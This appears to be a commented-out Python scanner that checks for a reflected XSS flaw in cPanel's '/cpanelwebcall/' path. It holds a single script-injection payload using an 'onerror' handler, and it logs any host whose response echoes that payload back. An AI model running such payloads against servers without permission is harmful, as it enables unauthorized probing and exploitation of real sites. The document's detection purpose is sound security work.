# import requests
# from includes.filewriter import writetofile

# payloads = ['/cpanelwebcall/<img src=x onerror="prompt(1)">aaaaaaaaaaaa']

# def scanner(url,output_file):
#     for payload in payloads:
#         fullurl = url+payload
#         response = requests.get(fullurl)
#         if response.status_code == 400:
#             if 'aaaaaaaa' in response.text:
#                 writetofile(fullurl,output_file)
#                 print("Vulnerable URL -> "+fullurl)



